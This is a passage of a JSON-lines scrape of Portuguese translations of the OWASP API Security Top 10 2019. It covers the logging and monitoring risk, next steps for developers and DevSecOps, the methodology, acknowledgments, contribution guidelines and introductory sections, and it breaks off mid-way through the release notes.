impossível, estes *endpoints* devem possuir o mesmo tratamento de segurança daqueles que estão em produção.\n* Quando novas versões da API incluir melhorias de segurança, faça uma análise de risco para auxiliar a decisão de mitigação de ações necessárias para a versão antiga da API. Por exemplo: sempre que for possível utilizar versões antigas sem quebrar compartibilidade, você precisa trabalhar para que todos os clientes façam o movimento para a última versão.\n\n## Referências\n\n### Externas\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:40.550035"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Insufficient Logging & Monitoring\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **2** | Prevalência **3** : Detecção **1** | Técnico **2** : Específico do negócio |\n| Atacantes podem tirar proveito de pouco log e monitoramento para abusar de sistemas sem serem notados. | Sem log e monitoramento, ou log e monitoramento insuficiente, é quase impossível rastrear atividades suspeitas e dar respostas à elas tem tempo hábil. | Sem visibilidade do que está ocorrendo de atividades maliciosas, atacantes possuem tempo para comprometer completamente sistemas. |\n\n## A API está vulnerável?\n\nA API está vulnerável se:\n\n* Não produz qualquer tipo de log, ou se o nível de log não é configurado adequadamente, ou ainda, se as mensagens de log não incluem informações suficientes.\n* A integridade do log não é garantida (Ex.: [Injeção de log][1]).\n* Logs não estão em contínuo monitoramento.\n* A infraestrutura da API não é continuamente monitorada.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nChaves de acesso de administração da API são vazados em um repositório público. O proprietário do repositório é notificado por e-mail a respeito do provável vazamento, mas, até que uma ação seja realizada em reposta ao incidente se passaram 48 horas. Em razão de logs insuficientes, a companhia não é capaz de identificar quais informações foram acessadas durante o período por atores maliciosos.\n\n### Cenário #2\n\nUma plataforma de compartilhamento de vídeos foi atingida por um ataque de *credential stuffing* de larga escala. Mesmo com os logins que falharam sendo logados, não houveram alertas disparados durante o tempo de duração do ataque. Como uma resposta à reclamação dos usuários, os logs de API foram analisados e o ataque foi detectado. A companhia fez um anúncio público solicitando aos seus usuários que façam atualização de suas senhas, e reportam o incidente às autoridades regulatórias.\n\n## Como prevenir\n\n* Faça log de todas tentativas de logon mal sucedidas, acessos negados e erros de validação de entradas de usuários.\n* Logs devem ser escritos em um formato apropriado para serem consumidos  por soluções de gerenciamento de logs, e devem incluir detalhes suficientes para ajudar a identificar o ator malicioso.\n* Logs devem ser manipulados como dados sensíveis, e sua integridade deve ser garantida tanto em trânsito como em repouso.\n* Configure o sistema de monitoramento a monitorar continuamente a infraestrutura, rede e o funcionamento da API.\n* Utilize um SIEM (*Security Information and Event Management*) para agregar e gerenciar logs oriundos de todos componentes da arquitetura da API e seus *hosts*.\n* Configure painéis de controle e alertas, possibilitando de atividades suspeitas sejam detectadas e respondidas de forma breve.\n\n## Referências\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### Externas\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://owasp.org/www-community/attacks/Log_Injection\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html\n[3]: https://owasp.org/www-project-proactive-controls/\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:40.665074"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xb0-next-devs.md", "content": "# Próximos passos para Desenvolvedores\n\nA tarefa de criar e manter software seguro, ou, corrigir software existente, pode ser uma tarefa difícil. APIs não são diferentes.\n\nNós acreditamos que a educação e conscientização são fatores chave para escrever software seguro. Tudo o que é necessário para alcançar este objetivo depende de **estabelecer e usar procedimentos de segurança reprodutíveis e padronizar controles de segurança**.\n\nO OWASP possui um grande número de fontes abertas para endereçar a segurança desde o princípio dos projetos. Por favor, visite a [página de projetos do OWASP][1] para uma extensa lista de projetos disponíveis.\n\n| | |\n|-|-|\n| **Educação** | Você pode iniciar lendo [os materiais de educação do OWASP][2] de acordo com sua área ou interesse. Para aprendizado mão-na-massa, nós adicionamos **crAPI** - **C**ompletely **R**idiculous **API** (API Ridiculamente Vulnerável) em [nosso roadmap][3]. Enquanto isso, você pode praticar segurança de aplicações web utilizando o [OWASP DevSlop Pixi Module][4], um aplicativo web vulnerável e um serviço API com a intenção de ensinar usuário como testar aplicações web modernas e também APIs com relação a problemas de segurança. Você pode também participar das [conferências AppSec do OWASP][5] com sessões de treinamento, ou ainda [juntar-se a seu capítulo local][6]. |\n| **Requisitos de Segurança** | Segurança deve fazer parte de qualquer projeto desde o princípio. Ao fazer a escolha de requisitos, é importante definir o que a \"segurança\" representa para o projeto. O OWASP recomenda o uso do [OWASP Application Security Verification Standard (ASVS)][7] como um guia para atribuir requisitos de segurança. Se você trabalha com *outsourcing*, considere o projeto [OWASP Secure Software Contract Annex][8], o qual deve ser adaptado de acordo com as leis e regulamentos locais. |\n| **Arquitetura de Segurança** | Seguraça deve permanecer uma preocupação durante todas as fases de um projeto. O [OWASP Prevention Cheat Sheets][9] é um bom ponto de partida e um guia sobre como o *design* de segurança durante a fase de arquitetura. Junto de vários outros, você encontrará [REST Security Cheat Sheet][10] e também [REST Assessment Cheat Sheet][11] com abordagem de aspetos de APIs. |\n| **Controle de Segurança Padrão** | A adoção de padrões de controles de segurança reduzem o risco da introdução de fraquezas durante o desenvolvimento da lógica específica do negócio no software. Fora o fato que frameworks modernos incluírem por padrão controles de segurança efetivos, considere o [OWASP Proactive Controls][12] que entrega uma boa visão geral sobre quais controles de segurança você deve avaliar e incluir em seu projeto. O OWASP também entrega algumas bibliotecas e ferramentas que podem ser úteis, como validação de controles. |\n| **Ciclo de Vida do Software Seguro** | Você pode utilizar o [OWASP Software Assurance Maturity Model (SAMM)][13] para melhorar seu processo enquanto constrói APIs. Muitos outros projetos do OWASP possuem valor para ajudá-lo com as diferentes fases do desenvolvimento de suas API, por ex.: o [OWASP Code Review Project][14]. |\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:40.775254"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xb1-next-devsecops.md", "content": "# Próximos passos para DevSecOps\n\nConsiderando sua importância na arquitetura de aplicações modernas, a construção de APIs seguras é crucial. A segurança não pode ser negligenciadas, e deve fazer parte de todo o ciclo de vida de desenvolvendo. Executar verificações e testes de penetração anualmente não é mais suficiente.\n\nDevSecOps deve se juntar aos esforços de desenvolvimento, facilitando a execução de testes contínuos de segurança durante todo o ciclo de desenvolvimento de software. O objetivo é melhorar o *pipeline* de desenvolvimento com automação de segurança, sem contudo impactar negativamente a velocidade do desenvolvimento.\n\nEm caso de dúvidas, mantenha-se informado, e reveja o [Manifesto DevSecOps][1] frequentemente.\n\n| | |\n|-|-|\n| **Compreensão do modelo de ameaça** | Teste de prioridades vem do modelo da ameaça. Se você não possui um, considere usar os projetos [OWASP Application Security Verification Standard (ASVS)][2], e também [OWASP Testing Guide][3] como entrada. Envolver a equipe de desenvolvimento pode ajudar a torná-los mais conscientes da segurança. |\n| **Compreensão do SDLC** | Junte-se ao time de desenvolvimento para melhor compreensão do ciclo de desenvolvimento de software (SDLC - Software Development Life Cycle). Sua contribuição com testes de segurança contínuos deve ser compatível com pessoas, processos e ferramentas. Todos devem concordar com o processo, assim evita-se atritos e resistências. |\n| **Estratégias de testes** | Uma vez que seu trabalho não deve impactar negativamente a velocidade do desenvolvimento, você deve escolher com cuidado a melhor (simples, rápida e precisa) técnica de verificação de requisitos de segurança. Consulte os projetos [OWASP Security Knowledge Framework][4] e [OWASP Application Security Verification Standard][5] que podem ser excelentes fontes de requisitos de segurança funcionais e não funcionais. Outras ótimas fontes de consulta são os [projetos][6] e [ferramentas][7] similares ao oferecidos pela [comunidade DevSecOps][8]. |\n| **Alcançando cobertura e precisão** | Você é a ponte entre os times de desenvolvimento e operações. Para alcançar cobertura, não dê atenção somente a funcionalidade mas também à orquestração. Trabalhe próximo ao dois times desde o início e assim você consegue otimizar seu tempo e esforço. Você deve também encontrar um momento onde o essencial da segurança seja continuamente verificado. |\n| **Comunique claramente problemas** | Contribua com menos ou nenhum atrito. Distribua os problemas encontrados em tempo hábil, utilizando as ferramentas que os times utilizam em sua rotina (nunca documentos PDF). Junte-se ao time de desenvolvimento para a correção de problemas encontrados. Construa oportunidades para educá-los, descrevendo claramente as fraquezas e como estas podem ser exploradas, incluindo cenários de ataques que demonstre cenários reais. |\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:40.880483"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xd0-about-data.md", "content": "# Dados e Metodologia\n\n## Visão Geral\n\nComo o setor de segurança de aplicação não se concentrou especificamente em mais recentes arquiteturas de aplicativos, na qual as API possuem um papel importante, compilar uma lista dos dez mais críticos riscos de segurança de API, baseados em uma chamada pública por informações, teria sido uma árdua tarefa. Apesar de não ter havido esta chamada por dados, a lista dos dez mais críticos ainda é baseada em dados públicos e com contribuições de *experts* em segurança, além de discussões abertas da comunidade.\n\n## Metodologia e Dados\n\nNa primeira fase, dados disponíveis publicamente sobre incidentes de segurança envolvendo APIs, os quais foram coletados por *experts* em segurança, e então foram revisados e categorizados. Estas informações foram coletadas de plataformas de *bug bounty* e bancos de dados de vulnerabilidades durante um ano inteiro, como propósito estatístico.\n\nNa fase seguinte profissionais de segurança com experiência em testes de penetração foram questionados a colaborar com suas listas de dez maiores ameaças à segurança de API.\n\nEntão a [Metodologia OWASP para classificação de risco][1] foi utilizada para a elaboração da análise de risco. Os resultados foram discutidos e revisados entre os profissionais de segurança. Para considerações nesse sentido, por favor, consulte o item [Riscos de Segurança de API][2].\n\nO primeiro rascunho do projeto é resultado de um consenso entre os dados estatísticos adquiridos na primeira fase com a lista entregue pelos profissionais de segurança. Este rascunho foi submetido à apreciação e revisão a um segundo grupo de profissionais de segurança com relevante experiência em segurança de APIs.\n\nO projeto OWASP API Security Top 10 2019 então foi apresentado pela primeira vez no evento OWASP Global AppSec Tel Aviv (Maio 2019), e desde então, está disponível no GitHub para discussões e contribuições.\n\nA lista de colaboradores está disponível na seção [Agradecimentos][3].\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:40.991942"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xd1-acknowledgments.md", "content": "# Agradecimentos\n\n## Agradecimentos aos colaboradores\n\nGostaríamos de agradecer os seguintes colaboradores que contribuiram publicamente via GitHub ou outros meios:\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n\n## Tradução para o português do Brasil\n\n* Raphael Hagi\n* Bruno Barbosa\n* Eduardo Bellis\n", "timestamp": "2025-10-24T22:26:41.108719"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/CONTRIBUTING.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/CONTRIBUTING.md", "content": "# Como contribuir\n\nQuando quiser contribuir com este repositório, por favor, antes discuta a mudança que deseja fazer enviando a questão com o proprietário do repositório antes de efetivar a mudança. Correções de digitação ou de refraseamento para melhor compreensão NÃO requerem discussão com o proprietário.\n\n## Modelo de *branching*\n\nEste repositório mantém dois *branches* principais com um tempo de vida indefinido:\n* `master` é o *branch* padrão e que portanto reflete a última *release*.\n* `develop` é o *branch* padrão refletindo as últimas modificações para o próximo *release*. Quando o *branch* `develop` alcança um estágio estável e está pronto para liberação de uma versão nova e final, todas as modificações desde são unificadas de volta no *branch* `master`.\n\nUma variadade de *branches* de suporte são utilizadas para cuidar de desenvolvimentos paralelos. Estes tipos de *branches* possuem um tempo de vida limitado, até serem eventualmente e definitivamente removidos.\n\n## Contribuindo\n\nContribuições a este repositório são bem-vindas. Para facilitar o gerencialmente, por favor, siga os passos abaixo descritos:\n\n1. Faça o *fork* do repositório na sua conta.\n\n2. Faça o clone desse repositório localmente.\n   ```\n   git clone https://github.com/YOU/API-Security.git\n   ```\n3. Crie um novo *branch* baseado no `develop` do projeto original. (Ex.: `fix/foreword-section`)\n   ```\n   git checkout develop && git checkout -b fix/foreword-section\n   ```\n4. Aplique suas modificações conforme necessário.\n\n   Por favor, sempre tenha atenção para seguir nossa convenção de estilos.\n\n   Embora exista um arquivo [`.editorconfig`][1] na raíz do repositório, seu editor pode talvez não suportá-lo. Para aprender mais sobre o [EditorConfig][2] e o suporte a IDEs e editores, consulta o website: https://editorconfig.org/.\n\n5. Faça o commit da suas mdificações.\n\n   1. Verifique os arquivos modificados e adicione apenas estes (ex.: artefatos de compilação NÃO DEVEM estar sob controle de versão).\n   2. A primeira linha da mensagem de *commit* deve informar uma breve descrição das modificações. Você pode detalhar melhor as mudanças no corpo do *commit*.\n\n6. Faça o *push* das mudanças para seu repositório público.\n   ```\n   git push origin fix/foreword-section\n   ```\n7. Abra um *pull request* do seu *branch* `fix/foreword-section` para o *branch* `develop` do repositório original do projeto.\n\n[1]: https://github.com/OWASP/API-Security/blob/master/.editorconfig\n[2]: https://editorconfig.org/\n", "timestamp": "2025-10-24T22:26:41.220326"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/README.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/README.md", "content": "# Os dez mais críticos riscos de segurança de API\n\nUma tradução para o português do Brasil do projeto OWASP API Security Top 10.\n\nEste projeto é desenhado para endereçar o contínuo aumento de organizações que entregam dados potencialmente sensíveis por meio de APIs em suas ofertas de software. Estas APIs são utilizadas para tarefas internas e para interface com parceiros. Infelizmente, muitas APIs não são submetidas a testes rigorosos de segurança, o que pode colaborar a deixá-las inseguras à ataques.\n\nO projeto OWASP API Security Project procura entregar valor aos desenvolvedores de software e também aos profissionais de segurança pontuando os potenciais riscos de APIs inseguras, e ilustrar como tais riscos podem ser mitigados. Como uma maneira de facilitar este objetivo, o OWASP API Security Project irá criar e manter o documento com os dez principais riscos, bem como um portal com a documentação com as melhores práticas para criação e acesso de APIs.\n\n## Descrição\n\nEquanto trabalhávamos com desenvolvedores ou consultores da segurança da informação, muitas pessoas encontraram APIs como partes de seus projetos. Euquanto existem algumas fontes que apoiam na criação e avaliação desse tipo de projeto (como o projeto OWASP REST Security Cheat Sheet), não havia um projeto destinado a assistir fabricantes, atacantes e defensores na comunidade.\n\nEste projeto tem como alvo:\n\n* Criar o documento OWASP Top Ten API Security Risks, o qual destacará de forma fácil os riscos mais comuns de segurança na área das APIs.\n* Criar um portal de documentação para desenvolvedores a construírem APIs de forma segura.\n* Trabalhar próximo à comunidade de segurança para manter vivos os documentos acompanhando as tendências de segurança.\n\n## Líderes do Projeto\n\n* [Erez Yalon][0]\n* [Inon Shkedy][5]\n\n## Tradutores do Projeto\n\n**Português do Brasil**\n\n* [Raphael Hagi][6]\n* [Eduardo Bellis][7]\n* [Bruno Barbosa][8]\n\n\n## Licenciamento\n\n**Os documentos do OWASP API Security Project são livres para uso!**\n\nO projeto OWASP API Security Project é licenciado sob Atribuição-CompartilhaIgual 4.0 Internacional (CC BY-SA 4.0)][1], então você pode copiar, distribuir e transmitir este trabalho. Você também pode adaptá-lo e usá-lo comercialmente, desde que dê os créditos ao trabalho. Se você alterar, transformar ou construir algo a partir deste trabalho, você pode distribuir o fruto desse trabalho apenas sob a mesma licença deste ou licença similar.\n\n[0]: https://www.owasp.org/index.php/User:ErezYalon\n[1]: https://creativecommons.org/licenses/by-sa/4.0/deed.pt_BR\n[2]: https://github.com/OWASP/API-Security/blob/develop/2019/en/dist/owasp-api-security-top-10.pdf\n[3]: https://github.com/OWASP/API-Security/tree/develop/\n[4]: https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n[5]: https://www.owasp.org/index.php/User:Inon\n[6]: https://www.linkedin.com/in/raphael-hagi/\n[7]: https://www.linkedin.com/in/eduardo-bellis-92482534/\n[8]: https://www.linkedin.com/in/bbarbosa85/\n", "timestamp": "2025-10-24T22:26:41.325756"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\nOs Dez Problemas de Segurança Mais Críticos em APIs\n\n29 de Maio, 2019\n\n![WASP Logo URL TBA](images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | Distribuído ao abrigo da licença [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:41.934490"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x00-notice.md", "content": "# Nota\n\nEsta é a versão de texto do OWASP API Security Top 10, usada como fonte para a\nversão oficial distribuída em formato PDF - Portable Document Format.\n\nContribuições para o projeto tais como comentários, correções ou traduções devem\nser feitas aqui. Para mais detalhes sobre [Como Contribuir][1], por favor\nconsulte a secção [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:42.040521"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x00-toc.md", "content": "# Tabela de Conteúdos\n\n* [Tabela de Conteúdos](0x00-toc.md)\n* [Sobre a OWASP](0x01-about-owasp.md)\n* [Prefácio](0x02-foreword.md)\n* [Introdução](0x03-introduction.md)\n* [Notas da Versão](0x04-release-notes.md)\n* [Riscos de Segurança em APIs](0x10-api-security-risks.md)\n* [OWASP Top 10 API Security Risks – 2019](0x11-t10.md)\n* [API1:2019 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Broken User Authentication](0xa2-broken-user-authentication.md)\n* [API3:2019 Excessive Data Exposure](0xa3-excessive-data-exposure.md)\n* [API4:2019 Lack of Resources & Rate Limiting](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Mass Assignment](0xa6-mass-assignment.md)\n* [API7:2019 Security Misconfiguration](0xa7-security-misconfiguration.md)\n* [API8:2019 Injection](0xa8-injection.md)\n* [API9:2019 Improper Assets Management](0xa9-improper-assets-management.md)\n* [API10:2019 Insufficient Logging & Monitoring](0xaa-insufficient-logging-monitoring.md)\n* [O Que Se Segue Para Programadores](0xb0-next-devs.md)\n* [O que Se Segue Para DevSecOps](0xb1-next-devsecops.md)\n* [Metodologia e Dados](0xd0-about-data.md)\n* [Agradecimentos](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:42.147011"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x01-about-owasp.md", "content": "# Sobre a OWASP\n\nOWASP - Open Web Application Security Project é uma comunidade aberta que se\ndedica a ajudar as organizações a desenvolver, adquirir e manter aplicações e\nAPIs confiáveis.\n\nA OWASP disponibiliza de forma livre e aberta:\n\n* Ferramentas e normas de segurança aplicacional\n* Livros completos sobre testes de segurança aplicacional, desenvolvimento\n  de código seguro e revisão de código focada em segurança\n* Apresentações e [vídeos][1]\n* [_Cheat Sheets_][2] sobre assuntos diversos\n* Controlos e bibliotecas de segurança _standard_\n* [Comunidades locais espalhados por todo o mundo][3]\n* Investigação de ponta\n* Múltiplas [conferências em todo o mundo][4]\n* [Listas de discussão][5]\n\nMais informação em: [https://www.owasp.org][6].\n\nTodas as ferramentas, documentos, vídeos, apresentações e comunidades locais da\nOWASP são livres e abertos a todos os interessados em melhorar a segurança\naplicacional.\n\nAconselhamos uma abordagem à segurança aplicacional como sendo um problema de\npessoas, processos e tecnologia, porque as abordagens mais eficazes à segurança\naplicacional necessitam de melhorias em todas estas áreas.\n\nA OWASP é um novo tipo de organização. A nossa independência em relação a\npressões comerciais permite-nos fornecer informação imparcial, prática e\neconomicamente adequada sobre a segurança aplicacional. A OWASP não está\nafiliada com nenhuma empresa tecnológica, embora suportemos o uso informado de\ntecnologias de segurança comerciais. A OWASP produz muitos tipos de materiais\nde uma forma colaborativa, transparente e aberta.\n\nA fundação OWASP é uma entidade sem fins lucrativos o que assegura o sucesso a\nlongo prazo do projeto. Quase todas as pessoas associadas à OWASP são\nvoluntárias, incluindo a direção da OWASP, os líderes das comunidades locais, os\nlíderes dos projetos e os seus membros. Suportamos investigação inovadora em\nsegurança através de bolsas e infraestrutura.\n\nJunte-se a nós!\n\n## Copyright and License\n\n![license](images/license.png)\n\nCopyright © 2003-2019 The OWASP Foundation. Este documento é distribuído de\nacordo com a licença [Creative Commons Attribution Share-Alike 4.0][7]. Para\nqualquer tipo de reutilização ou distribuição, deve deixar claro para terceiros\nos termos da licença deste trabalho.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://owasp.org/www-project-cheat-sheets/\n[3]: https://owasp.org/chapters/\n[4]: https://owasp.org/events/\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:42.256731"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x02-foreword.md", "content": "# Prefácio\n\nAs APIs - _Application Programming Interface_ têm um papel fundamental na\ninovação que observamos nos dias de hoje ao nível das aplicações. Desde a banca,\nretalho e transportes à Internet das Coisas (IoT), veículos autónomos e _Smart\nCities_, as APIs são hoje um elemento crítico nas aplicações móveis, _Software\nas a Service_ (SaaS) e aplicações web, sejam elas destinadas ao público em\ngeral, parceiros de negócio ou para uso interno das organizações.\n\nPor definição as APIs expõem lógica aplicacional e dados sensíveis tais como\ninformação pessoal (PII - _Personally Identifiable Information_), motivo pelo\nqual se têm vindo a tornar um alvo para os atacantes. Se não conseguirmos\ngarantir a segurança das APIs será impossível continuar a inovar a um ritmo\nacelerado.\n\nApesar de continuar a fazer sentindo manter uma lista dos 10 principais\nproblemas de segurança em aplicações web, devido à natureza particular das APIs,\né importante haver também uma tal lista específica para APIs.\nA segurança das APIs foca-se nas estratégias e soluções para compreender e\nmitigar as vulnerabilidades e risco de segurança associado às APIs.\n\nSe estiver familiarizado com o projeto [OWASP Top 10][1] com certeza notará as\nsemelhanças entre os documentos: elas são propositadas para facilitar a leitura\ne adoção deste. Se por outro lado for a primeira vez que tem contacto com um\ndocumento da série OWASP Top 10, sugerimos que comece por ler as secções [Riscos\nde Segurança em APIs][2] e [Metodologia e Dados][3] antes de aprofundar a lista\ndos dez problemas de segurança mais críticos em APIs.\n\nPode contribuir para o OWASP API Security Top 10 com perguntas, comentários e\nideias no repositório do projeto no GitHub:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nPode ainda encontrar o OWASP API Security Top 10 em:\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security\n\nGostaríamos de agradecer a todos os que participaram neste projeto, tornando-o\npossível com o seu empenho e contribuições. A lista de contribuidores\nencontra-se na secção [Agradecimentos][4].\n\nObrigado!\n\n[1]: https://owasp.org/www-project-top-ten/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:42.367740"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x03-introduction.md", "content": "# Introdução\n\n## Bem-vindo ao OWASP API Security Top 10 - 2019!\n\nBem-vindo à primeira edição do OWASP API Security Top 10. Se estiver\nfamiliarizado com a série OWASP Top 10 seguramente notará as semelhanças: elas\nsão propositadas em prol da compreensão e adoção deste documento. Caso este seja o seu\nprimeiro contacto com este tipo de documento, considere visitar a página do\n[OWASP API Security Project][1] antes de prosseguir para os principais problemas\nde segurança de APIs.\n\nAs APIs desempenham um papel muito importante na arquitetura das aplicações\nmodernas. Uma vez que a consciencialização para a segurança e a inovação têm\nritmos diferentes, é importante concentrarmo-nos nas falhas mais comuns em APIs.\n\nO objetivo principal do OWASP API Security Top 10 é educar todos aqueles\nenvolvidos no desenvolvimento e manutenção de APIs, como por exemplo,\nprogramadores, _designers_, arquitetos, gestores ou organizações.\n\nNa secção [Metodologia e Dados][2] pode ler mais sobre como esta primeira\nedição foi criada. Nas versões futuras queremos envolver a industria de\nsegurança através duma chamada pública para contribuição de dados. Por agora\nencorajamos todos a contribuírem com perguntas, comentários e ideias no nosso\n[repositório no GitHub][3] ou através da [_Mailing list_][4].\n\n[1]: https://owasp.org/www-project-api-security/\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:42.488301"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x04-release-notes.md", "content": "# Notas da Versão\n\nEsta é a primeira edição do OWASP API Security Top 10, que prevemos atualizar\nperiodicamente a cada três ou quatro anos.\n\nAo contrário desta versão, em futuras versões, queremos fazer uma chamada\npública para contribuição de dados, envolvendo a industria de segurança neste\nesforço. Na secção [Metodologia e Dados][1] encontrará mais detalhes sobre como\nconstruímos esta versão. Para mais informação sobre os riscos de segurança, por\nfavor consulte a secção [Riscos de Segurança em APIs][2].\n\nÉ importante tomar consciência que nos últimos anos a arquitetura das aplicações\nsofreu alterações significativas. Atualmente as APIs desempenham um papel muito\nimportante, em particular em arquitetura de micro-serviços, _Single Page\nApplications_ (SPAs), aplicações móveis, Internet da Coisas (IoT), etc.\n\nEra imperativo criar o OWASP API Security Top 10 para consciencializar a\ncomunidade sobre os atuais problemas de segurança em APIs. Isto foi apenas\npossível graças ao enorme esforço dum conjunto de voluntários, todos eles\nmencionados na secção [Agradecimentos][3]. Obrigado!\n\n## Notas da Tradução\n\nA tradução do OWASP API Security Top 10 2019 foi realizada de forma voluntária\ncom o objetivo de tornar este documento acessível a todos, independentemente do\ndomínio da língua em que este 